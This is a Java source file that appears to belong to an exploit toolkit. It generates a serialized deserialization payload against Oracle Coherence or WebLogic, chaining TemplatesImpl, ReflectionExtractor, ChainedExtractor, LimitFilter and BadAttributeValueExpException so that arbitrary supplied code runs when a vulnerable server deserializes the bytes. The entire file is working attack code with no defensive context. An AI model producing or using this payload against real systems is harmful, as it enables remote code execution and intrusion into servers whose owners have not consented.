package com.feihong.payload;

import com.feihong.utils.Gadgets;
import com.feihong.utils.Reflections;
import com.feihong.utils.Util;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;

import javax.management.BadAttributeValueExpException;
import java.io.FileOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class TemplatesImplPayload {
    public static byte[] generate(String code) throws Exception {
        final Object evilObject = Gadgets.createTemplatesImpl(code);

        ReflectionExtractor extractor1 = new ReflectionExtractor(
                "getMethod",
                new Object[]{"newTransformer", new Class[0]}
        );

        ReflectionExtractor extractor2 = new ReflectionExtractor(
                "invoke",
                new Object[]{evilObject , new Object[0]}

        );

        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                extractor1,
                extractor2
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(valueExtractors);
        LimitFilter limitFilter = new LimitFilter();

        //m_comparator
        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, chainedExtractor);

        //m_oAnchorTop
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, TemplatesImpl.class);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, limitFilter);

        return Util.serialize(badAttributeValueExpException);
    }
}
